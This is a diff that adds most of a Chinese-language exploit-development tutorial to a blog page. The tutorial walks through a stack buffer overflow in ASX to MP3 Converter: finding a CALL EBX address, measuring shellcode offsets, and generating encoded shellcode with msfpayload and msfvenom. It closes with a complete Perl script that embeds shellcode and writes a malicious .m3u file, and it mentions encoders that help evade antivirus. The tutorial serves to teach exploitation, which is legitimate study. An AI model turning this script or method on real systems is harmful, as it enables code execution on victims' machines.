@@ -168,9 +168,85 @@
 <p>以下将是Hack过的Mona输出信息：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/3cbbf3aa7e196f481bd5b257733f73f2.png" alt=""><br>现在你能看到已经返回所有实例的EIP了</p>
 <h2 id="定位ShellCode">定位ShellCode</h2><p>现在我们确定了可以控制EIP（改变执行流程）。我们已经准备好修改Exp脚本来使其执行我们所选择的代码了。为了重定向执行过程，我们需要确定我们的Shellcode被分配到正确位置，然后确定其EIP。要搞定它，我们得在程序崩溃和EIP覆盖时，检查CPU寄存器和内存中的内容。让我们回到ImDbg的CPU视图：<br>注意这里有3个寄存器，他们当前都指向一些位置，在我们这50000字节的缓冲区中：EBX、ESP和EBP<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/b9b60233ba8e30c298facdf5eb7442d6.png" alt=""><br>我们想让我的EIP覆盖，让程序重定向到这3个寄存器中的某一个值，来执行其指向的代码。我选择哪个寄存器依据如下几个原则：</p>
 <ol>
-<li></li>
-<li>dafadf</li>
+<li>在这块不间断代码的数量 —— 有时，我们的Exp代码写入内存时会被乱序或者删减，所以我们需要确定在那块有足够的空间来插入有用的ShellCode（通常至少需要500字节），并且怎么着代码都不会被程序修改。</li>
+<li>我们能够重定向其中一个寄存器 —— 为了告诉程序重定向一个寄存器指向我们的ShellCode，我们需要用一个已经存在的指令（如JMP或者CALL）覆盖EIP。记住，EIP被覆盖的时候是用一个地址指针，而不是一个确切的指令。换言之，我们不能直接用对应的OPODE来跳到ESP（jump \xff\xe4）。反倒，我们需要用一个指向类似指令的内存地址来覆盖它。最重要的是，我们需要确定那个所用的地址时候否包含空字节（\x00）。为啥？因为一个空字节代表着结束，意味着只要程序遇到空字节，执行就会终止，并且你覆盖EIP之后的任何代码（在这里是我们的Shellcode）都不会执行了。这里也有一些空子节例外的例子，但是只要记住我们尽量避免有出现空字节就行了。如果你还是有些疑惑，没关系，我将慢慢给你演示。</li>
 </ol>
+<p>OK，所以我们需要告诉程序重定向或者跳到某个寄存器指向的地址。在这里，我们非常幸运，因为我们有足够的寄存器可以选择：EBX、ESP和EBP。<br>让我们用上面说的第一个标准来检查EBX寄存器：在那处连续的代码数量。在CPU寄存器面板，EBX地址处右键单击“跟随Dump”<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/c0c5dd28b901aa5fb80b438820912eea.png" alt=""><br>在内存Dump面板（左下角）你能够看到那块地址上下文的内容。向下滚动，注意看如果这里有任何空隙在这段缓冲区。终于，你能看到有空挡的地方了，在我这里恰巧是在000FCFCC后面。</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/fd0cfa09762e9cca54633672dc1f5e87.png" alt=""> </p>
+<p>要预判我们在EBX有多少连续的ShellCode空间，我们能够从EBX开始（000FBBD4）到000FCFCCC相减。结果是0x13F8或者5112字节。那真是太特么足够了，所以EBX合格！<br>我们能继续这个尝试放到其他两个寄存器上（ESP和EBP）来确定那块是醉驾的。或者，我们用!mona findmsp来检查有效的空间。记住out-of-the-box，通过findmsp得出偏移只有对应的模式第一次出现，但检测长度仍应准确，对你有用当确定可用的空间shellcode。输入!mona findmsp 然后看下三个寄存器返回的长度</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/2ca961ad71feed6942ed9f8f14b4ae49.png" alt=""> </p>
+<p>我们将要用的可用空间，在ESP处有很多，所以让我们检查用第二标准来检查下ESP：我们是否有能力控制重定向到我们的EIP覆盖点。作为第一个栈溢出的例子，我们将会只使用一个简单跳转或则调用来到达我们想要的寄存器。要完成这额，我们需要找到JMP ESP或者CALL ESP指令。<br>这里演示了你在ImDbg中该如何做：<br>在CPU指令面板右键点击，选择“搜索”—-&gt;“模块中所有命令”。这样将会搜索当前载入内存的模块中所有的jmp/call指令。<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/5e3c36843f4f71abda7941959ab8a464.png" alt=""><br>在条件框种输入目标指令，这里是“jmp esp”：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/f40410049578c7b90956e51ad76db0ea.png" alt=""><br>你能在以下截图中看到，我们获得许多结果，但问题是未已能用的地址（这些绿色的）都是系统模块 —— 注意他们全是”C:\Windows”和”C:\Program fiels\Mini-Stream\ASX to MP3 Converter…“，当这些DLL（模块）被确认是显然有用的有效指令，系统模块也许会在不同情况下有不同口味（版本不一样，函数的偏移不同?)。举个例子，一个DLL地址可能在Windows XP SP2和SP3上不同，或者都在SP3上但法文版和英文版不同。为了保证更好的可移植性的利用代码，你要选择的指令尽可能在固定应用模块。</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/5029285280cf4c14695aa6768f0a2782.png" alt=""> </p>
+<p>不幸的的是，我们得到了很相似的ijeguo（所有的系统模块），如果我们尝试call esp呢？注：这里有其他一些指令我们可以尝试，但是因为举例简单，所以我们仅仅只看jump和call.</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/402bdd26ad20dede20114716705b94d1.png" alt=""> </p>
+<p>对于ESP寄存器来说，尽管程序自身美柚包含必须的jmp/call指令，我们在本例中仍然有两个可以使用的寄存器来替代OS模块，让我们先来试试<br>尝试搜索call ebx指令，这个时候结果包含了很多程序领空的指令地址</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/2622b80751a5991e5268203236a7134d.png" alt=""> </p>
+<p>第一个结果的问题是他们都伴随有空字节，当你重新调用的时候会被当做一个字符串的结束，阻止EIP覆盖后的ShellCode执行。向下滚动，你可以看到一些没伴随空字节的地方：</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/8a02e88c363771935190f3addfa029c3.png" alt=""> </p>
+<p>让我们来任选一个 —— 我选的是 01C27228 （从 MSA2Mcodec00.dll）。这个值我们将用于覆盖EIP。<strong>重要！！</strong>：你的Call ebx地址将会不同于你在前面截图看到的，这是因为一个叫地址”rebasing”的玩意儿导致的。实际上，你在Part3会看到，有很好的理由选择一个操作系统模块在这种情况下一个应用模块，尽管现在我还不想进入下一章节。到目前为止，你能够从程序任何一个call ebx地址继续，只要它不包含空字节。只要注意如果你重启了你的机器，Exp可能就不会再有效了，你也不得不重新选择其他的call ebx地址。<br>OK，所以我们已经成功复现了程序的崩溃，验证了EIP的控制，验证了我们的偏移到EIP（26,121），我们有一个寄存器（EBX）指向足 够长度的连续的缓冲区，并且我们有一个可用的地址覆盖EIP来call ebx指令。让我们把所有这些汇成代码。</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/6a9fd809fdf8e2cca87b9ae05ed46bfb.png" alt=""> </p>
+<h2 id="找到我们的ShellCode偏移">找到我们的ShellCode偏移</h2><p>这是由我们50000字节组成的缓冲区：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/ce862f325e0d2fb496eb2386a6596f85.png" alt=""><br>EBX寄存器指向一个 a ～ 5100 字节的段填满了缓冲区的一部分。但是在哪儿？我们需要知道，所以我们可用有战略性的部署我们的ShellCode。我们可用使用一些不同的方法来确定ShellCode的偏移。</p>
+<h3 id="暂停程序执行确定Shellcode偏移">暂停程序执行确定Shellcode偏移</h3><p>看一下我们的Exp截图<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/e226d2e9e70abb9d94e6bcbf7011aed5.png" alt=""><br>我们完成了构造INT（打断）指令（十六进制\xCC）来填充缓冲区区域。当程序执行到<br>INT的时候，它将会暂停。在调试器中，这是非常有利于我们观察CALL EBX在我们的缓冲区中的具体位置的。让我们看一眼当打开新的m3u文件时，缓冲区中发生了神马：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/4fefc5cfc9055606b58af6004d75f4a0.png" alt=""><br>你能看到当程序执行到INT确实暂停了。EBX包含000FBBD4和EIP 000FBBD5（当前指令）。如果我们在内存Dump面板中跟随上一次的内存地址，然后拖动滚动条到我们缓冲区的起始位置，我们就会在000F729E这里停下来。如果我们减去000FBD5（EBX的起始位置），我们将得到0x4937也就是十进制18743。这是最接近于我们CALL EBX指令的缓冲区长度，我们将会把ShellCode放在它后面。为啥说最接近于？缓冲区中可能有其他的一些地方是非连续的或者在写内存的时候被删除了，所以我们知道至少需要18743字节的缓冲区填充在能到达我们准备的ShellCode地址。我一会儿将演示一个更精确的计算长度方法。<br>另一个方法就是看它从我们要替换Exp代码缓冲区开始有多远？要算出来，在$fill（Junk + EIP =26125）之前加上18743缓冲区长度，等于44868。换句话说，至少，我们的ShellCode能够在缓冲区第一个44686字节跑起来（尽管我们想多做一点，来计算内存中变化的位置或可能打断我们缓冲区的位置）<br>使用INT暂停程序执行，并且检查内存/寄存器是一种快速决定SHellCODE替换位置的方法，但是这里还有更多更准确的方法。</p>
+<h3 id="使用Msf的Pattern_offset-rb脚本">使用Msf的Pattern_offset.rb脚本</h3><p>Msf的这个脚本能够告诉我们EBX的准确位置，在基于模式匹配的缓冲区中（其就是使用姊妹脚本pattern_create.rb创建的），在崩溃/EIP覆盖时，重新查看我们的寄存器内容：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/b9b60233ba8e30c298facdf5eb7442d6.png" alt=""><br>EBX以Fn9F开头。使用Msf的脚本，我们能计算出准确模式缓冲区在哪儿分配：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/6ac7fccd47c1fa142d350db5990adfd9.png" alt=""><br>在我们的情况中，偏移是44877。在把这个脚本变为我自己的之前，让我演示下如何通过Mona插件获得同样的结果。</p>
+<h3 id="使用Mona插件">使用Mona插件</h3><p>你可以使用从Mona里看到EBX缓冲区的偏移，只要敲以下 findmsp：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/c85493d7599f287ea29d2cf04be2ff96.png" alt=""><br>再一次，用out-of-the-box的mona插件， 你智能看到第一个偏移，但是截图中我更新过代码后就能看到确定的偏移了，就44877。<br>现在，我们知道了ShellCode的偏移，让我们更新下Exp的代码。如果一个偏移是44877，第一个26125 字节将被我们用垃圾代码填充（26121字节），然后覆盖EIP（后面的4字节）。这里保留了18752字节来写我们的ShellCode。让我们把脚本改成如下这样：</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/0841106bc896923855d820c65300bb0d.png" alt=""> </p>
+<p>我在这里所做的仅仅只是加了一个$nop变量，其会把整个缓冲区在EIP后的都填满，并且在我们的SHellCode之前为了模拟到ShellCode偏移44877。我创建了一个比需要的SHellCode更长的$nops空间，并且都是由INT组成的，所以如果程序执行到$nops的空间，会直接暂停且我们能够看到已经做完了。如果从pattern_offset/mona得到的偏移是正确的，CALL EBX将会跑到正确的最后一个INT指令的位置（$nops区域的缓冲区 18752 + 1）。让我们用新的m3u跑起来，看看ImDbg的结果：</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/31c0a028a3b84d0c73adf44ba2b20b58.png" alt=""> </p>
+<p>如你所见，我们刨刀了正确的最后一个INT指令上，然后下一条指令的第一个字节就是$fill的区域了（马上就到ShellCode那块了），这意味着pattern_offset/mona提供的偏移地址是正确的。事实上，我们还没有完全算正确 —— 我们的原始预测替换的地方就刚刚好了，因为我们能够（也一定）总是能放到一块不错的缓冲区，在我们的ShellCode在内存中被允许偏离之前。<br>这样做，我们会使用NOP来作为典型的例子，其在x86架构上的十六进制值是0x90。这一连串的NOPS放到一起形成了，通常叫为NOP链。当程序执行这一系列的NOPS时，它将会防守不管直到遇到一个可执行的指令，在我们这个例子中就是ShellCode了。<br>当构造完缓冲区时，一个好的主意通常是有EIP CALL/JMP指令在这一系列NOPS的开始或者中间。一旦我们有另一个很大的空间能够放SHellCOde，我将会在这之前放上一堆长度为18852（偏移18752 + 额外100长度填充）的NOP链。这个完整的缓冲区区域将会对Shellcode偏移和NOPS链都有用。<br>现在我们的缓冲区看起来就想下面这样子（最后一段区域是SHellcode）：</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/12b16f79264a7a278b41345401a0c957.png" alt=""> </p>
+<h2 id="构造ShellCode">构造ShellCode</h2><p>最后一件需要做的事情，就是搞一些有实际用处的ShellCode了。当然，我们选择的ShellCode依赖于我们想干嘛 —— 比如弹个远程的Shell或者加个管理员用户等等。在我们的例子中，我将会选择一些适合初学者的 —— 打开WIndows自带的计算器（calc.exe）。下一件事情，我们要考虑的就是我们有没有一些特殊字符会打断ShellCode。举个例子，原因我们已经讨论过了，空字节在ShellCode中会有问题。同样有问题的还有回车、换行和其他字符串终止符。同样的情况下，程序本身也有可能不能处理某些字符或者值的变化（转换/编码/特征值等）。结果就是，ShellCode创建一些可能会引起错误的东西。幸运的是，在我们的例子中，ShellCode的创建是非常顺利的。你可以从Exp-db下载/复制ShellCode，但是这个例子中，我会给你展示如何用Msf创建一些基本的Payloads。<br>msf有一个命令行的ShellCode构造器功能叫msfpayload（新版本已经被分离咯～）你可以使用 -l 来切换 windows的payloads </p>
+<p><em>msfpayload -l | grep windows</em></p>
+<p>在我们的例子中，我将使用windows/exec这个Payloads，它的功能就是执行命令，和适合运行calc.exe。要使用msfpayload，你需要知道每个Payloads的相关选项，你可以通过在后面后面加上参数O。<br>给出可用的选项，语法如下：</p>
+<p><em>msfpayload windows/exec CMD=calc.exe R</em></p>
+<p>如果你用O参数来查看选项，你也许会注意到一个附加的选项叫 EXITFUNC。这个参数控制了ShellCode执行完之后会如何退出。我没有特意设定一个EXITFUNC的值，这意味着默认值“Thread”将会被启用，其会只会结束相关的线程。另一个选项和Payload退出相关的就是 SEH（让异常处理接管退出）和进程（干掉整个进程而不仅仅是线程）。EXITFUNC选项能够创建一个不同的效果，如Exp有啥行为在其结束后，所以你得尝试以下。举个例子，如果你注入一个Exp到父进程，进程会继续跑在Exp结束线程的时候，你也许想知道避免进程和替换固定线程。类似的，选择SEH选项，如果程序美柚执行任何错误处理的话，将会引起进程退出（那个最熟悉的提示）。<br>CMD选项就是它本身所代表的解释了，R选项代表着生成原始码，其会用原始的字节码输出我们的SHellCode。然后，我们需要在写进脚本之前将ShellCode编码。为了这样，我们能够重定向管道一些Msfpayload到Msfencode来实现，语法如下：</p>
+<p><em>msfpayload windows/exec CMD=calc.exe R | msfencode -e x86/shikata_ga_nai -c 1 -t perl </em></p>
+<p>-e 选项告诉msfencode哪个编码器将要使用，-c选项告诉有多少次迭代，-t选项则是输出那种格式，-b选项则告诉编码器有哪些坏字符需要排除。这个命令显示了227个a生成。在以后的帖子了，我准备了详细的编码相关的文章。但现在只要吉珠选择哪个编码器会影响到程序编码用户的输入（比如unicdoe），并且同时能够绕过杀毒软件的查杀。<br>另外一个小技巧，你可以干同样的事儿，用msfvenom模块，语法如下：</p>
+<p><em>msfvenom -p windows/exec CMD= calc.exe -f perl -b ‘\x00\xff\x0a\x0d’</em></p>
+<p>随便哪个都是可以来生成的～<br>你可以找到更多关于使用msfpayload的信息，链接在这里 <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload" target="_blank" rel="external">http://www.offensive-security.com/metasploit-unleashed/Msfpayload</a></p>
+<h2 id="整合到一块儿">整合到一块儿</h2><p>现在我们有了一个227字节的ShellCode，我们的最终的缓冲区看起来是像这样的（主要到我们有一个额外的4796字节空间能够让我们做一些想做的事情，比如用其他的ShellCode，体积大点儿的）。<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/bf04a50c8ac999216664234301da3e1f.png" alt=""><br>这里是完整的ShellCode</p>
+<pre><code><span class="comment">#!/usr/bin/perl</span>
+ my $buffsize = <span class="number">50000</span>; <span class="comment"># sets buffer size for consistent sized payload</span>
+my $junk = <span class="string">"\x41"</span> x <span class="number">26121</span>; <span class="comment"># offset to EIP overwrite</span>
+my $eip = pack('V', <span class="number">0x01C27228</span>); <span class="comment"># call ebp (MSA2Mcodec00.dll) - YOURS WILL DIFFER!</span>
+my $nops = <span class="string">"\x90"</span> x <span class="number">18752</span>;  
+
+<span class="comment"># msfpayload windows/exec CMD=calc.exe R |</span>
+<span class="comment"># msfencode -e x86/shikata_ga_nai -c 1 -t perl -b '\x00\x0a\x0d\xff'</span>
+<span class="comment"># size 227</span>
+my $shell =
+<span class="string">"\xba\x8d\xf5\x02\x51\xda\xc0\xd9\x74\x24\xf4\x5b\x2b\xc9"</span> .
+<span class="string">"\xb1\x33\x31\x53\x12\x03\x53\x12\x83\x66\x09\xe0\xa4\x84"</span> .
+<span class="string">"\x1a\x6c\x46\x74\xdb\x0f\xce\x91\xea\x1d\xb4\xd2\x5f\x92"</span> .
+<span class="string">"\xbe\xb6\x53\x59\x92\x22\xe7\x2f\x3b\x45\x40\x85\x1d\x68"</span> .
+<span class="string">"\x51\x2b\xa2\x26\x91\x2d\x5e\x34\xc6\x8d\x5f\xf7\x1b\xcf"</span> .
+<span class="string">"\x98\xe5\xd4\x9d\x71\x62\x46\x32\xf5\x36\x5b\x33\xd9\x3d"</span> .
+<span class="string">"\xe3\x4b\x5c\x81\x90\xe1\x5f\xd1\x09\x7d\x17\xc9\x22\xd9"</span> .
+<span class="string">"\x88\xe8\xe7\x39\xf4\xa3\x8c\x8a\x8e\x32\x45\xc3\x6f\x05"</span> .
+<span class="string">"\xa9\x88\x51\xaa\x24\xd0\x96\x0c\xd7\xa7\xec\x6f\x6a\xb0"</span> .
+<span class="string">"\x36\x12\xb0\x35\xab\xb4\x33\xed\x0f\x45\x97\x68\xdb\x49"</span> .
+<span class="string">"\x5c\xfe\x83\x4d\x63\xd3\xbf\x69\xe8\xd2\x6f\xf8\xaa\xf0"</span> .
+<span class="string">"\xab\xa1\x69\x98\xea\x0f\xdf\xa5\xed\xf7\x80\x03\x65\x15"</span> .
+<span class="string">"\xd4\x32\x24\x73\x2b\xb6\x52\x3a\x2b\xc8\x5c\x6c\x44\xf9"</span> .
+<span class="string">"\xd7\xe3\x13\x06\x32\x40\xeb\x4c\x1f\xe0\x64\x09\xf5\xb1"</span> .
+<span class="string">"\xe8\xaa\x23\xf5\x14\x29\xc6\x85\xe2\x31\xa3\x80\xaf\xf5"</span> .
+<span class="string">"\x5f\xf8\xa0\x93\x5f\xaf\xc1\xb1\x03\x2e\x52\x59\xea\xd5"</span> .
+<span class="string">"\xd2\xf8\xf2"</span>;
+
+my $sploit = $junk.$eip.$nops.$shell; <span class="comment"># sploit portion of buffer</span>
+my $fill = <span class="string">"\x43"</span> x ($buffsize - (length($sploit))); <span class="comment"># filler for consistency</span>
+my $buffer = $sploit.$fill; <span class="comment"># build final buffer</span>
+
+<span class="comment"># write the exploit buffer to file</span>
+my $file = <span class="string">"asx2mp3.m3u"</span>;
+open(<span class="type">FILE</span>, <span class="string">"&gt;$file"</span>);
+print <span class="type">FILE</span> $buffer;
+close(<span class="type">FILE</span>);
+print <span class="string">"Exploit file created ["</span> . $file . <span class="string">"]\n"</span>;
+print <span class="string">"Buffer size: "</span> . length($buffer) . <span class="string">"\n"</span>; 
+</code></pre><p> 最终产生的.m3u文件，然后用ASX to MP3 Converter来打开它，你将会看见：</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/5d84cc801853cdb59b3d4e0dce16aba3.png" alt=""> </p>
+<p>如果计算器没有运行，确认你打开的.m3u文件是在你的C盘根目录，并且你重命名为了asx2mp3.m3u。吉珠，这个Exp是一个离完美很远的挫玩意儿，因为文件路径影响了DLL的重定向等相关问题，我们将会在 Part3 中来继续讨论这个问题。</p>
+<h2 id="结论">结论</h2><p>那就这样吧～</p>
 
         
       </div>
@@ -284,7 +360,7 @@
       <div class="post-toc-wrap sidebar-panel-active">
         <div class="post-toc-indicator-top post-toc-indicator"></div>
         <div class="post-toc">
-          <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows_漏洞利用程序开发之栈溢出"><span class="nav-number">1.</span> <span class="nav-text">Windows 漏洞利用程序开发之栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于栈缓冲区溢出"><span class="nav-number">1.1.</span> <span class="nav-text">关于栈缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#找到有漏洞的程序"><span class="nav-number">1.2.</span> <span class="nav-text">找到有漏洞的程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现漏洞/崩溃"><span class="nav-number">1.3.</span> <span class="nav-text">复现漏洞/崩溃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#控制EIP的覆盖（确定偏移地址）"><span class="nav-number">1.4.</span> <span class="nav-text">控制EIP的覆盖（确定偏移地址）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定位ShellCode"><span class="nav-number">1.5.</span> <span class="nav-text">定位ShellCode</span></a></li></ol></li></ol>
+          <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows_漏洞利用程序开发之栈溢出"><span class="nav-number">1.</span> <span class="nav-text">Windows 漏洞利用程序开发之栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于栈缓冲区溢出"><span class="nav-number">1.1.</span> <span class="nav-text">关于栈缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#找到有漏洞的程序"><span class="nav-number">1.2.</span> <span class="nav-text">找到有漏洞的程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现漏洞/崩溃"><span class="nav-number">1.3.</span> <span class="nav-text">复现漏洞/崩溃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#控制EIP的覆盖（确定偏移地址）"><span class="nav-number">1.4.</span> <span class="nav-text">控制EIP的覆盖（确定偏移地址）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定位ShellCode"><span class="nav-number">1.5.</span> <span class="nav-text">定位ShellCode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#找到我们的ShellCode偏移"><span class="nav-number">1.6.</span> <span class="nav-text">找到我们的ShellCode偏移</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#暂停程序执行确定Shellcode偏移"><span class="nav-number">1.6.1.</span> <span class="nav-text">暂停程序执行确定Shellcode偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Msf的Pattern_offset-rb脚本"><span class="nav-number">1.6.2.</span> <span class="nav-text">使用Msf的Pattern_offset.rb脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Mona插件"><span class="nav-number">1.6.3.</span> <span class="nav-text">使用Mona插件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构造ShellCode"><span class="nav-number">1.7.</span> <span class="nav-text">构造ShellCode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#整合到一块儿"><span class="nav-number">1.8.</span> <span class="nav-text">整合到一块儿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结论"><span class="nav-number">1.9.</span> <span class="nav-text">结论</span></a></li></ol></li></ol>
         </div>
         <div class="post-toc-indicator-bottom post-toc-indicator"></div>
       </div>
